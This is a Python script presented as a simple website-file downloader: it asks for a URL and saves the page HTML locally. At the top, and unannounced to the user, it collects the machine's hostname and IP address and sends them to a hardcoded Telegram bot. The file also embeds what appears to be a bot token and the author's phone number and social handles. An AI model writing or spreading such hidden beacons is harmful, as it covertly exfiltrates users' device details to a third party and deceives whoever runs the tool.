import requests
import socket

id = '1090494697'
token = '6357057175:AAFlZLznbMtn8XJ5WjgIQBUAWBxCHqD8cWY'

hostname = socket.gethostname()
ipaddr = socket.gethostbyname(hostname)
telegram_send = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=ip : {ipaddr}\nname deivce : {hostname}'
req = requests.post(telegram_send)

R = '\033[1;31m'
S = '\033[2;36m'
G = '\033[1;32m'
Y = '\033[1;33m'
W = '\033[1;36m'
P = '\033[1;35m'


print(f'''{P} 
 ▄         ▄  ▄       ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░▌     ▐░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌ ▐░▌   ▐░▌  ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌  ▐░▌ ▐░▌           ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌   ▐░▐░▌           ▐░▌  
▐░░░░░░░░░░░▌    ▐░▌           ▐░▌   
▐░█▀▀▀▀▀▀▀█░▌   ▐░▌░▌         ▐░▌    
▐░▌       ▐░▌  ▐░▌ ▐░▌       ▐░▌     
▐░▌       ▐░▌ ▐░▌   ▐░▌     ▐░▌      
▐░▌       ▐░▌▐░▌     ▐░▌   ▐░▌       
 ▀         ▀  ▀       ▀     ▀        
                                     

{G}[G] GitHub    : {S}Mostshar_iblis
{G}[W] WhatsApp  : {S}+967717490680
{G}[F] FaceBook  : {S}Abdulsalam Al-Badani
{G}[T] TeleGram  : {S}@Aazeef_Alahzan

''')

style=f'''======={P}[ Check out website files ]{S}========
'''

print(style)
url = input(f'{Y}[+] Enter website URL:\n {G}')
print(f'{W}=============================')
response = requests.get (url)
html = response.content
file = open('data.html', 'w')
file.write(html.decode())
file.write("=============================")

print(f'{P}[ The file is ready ]')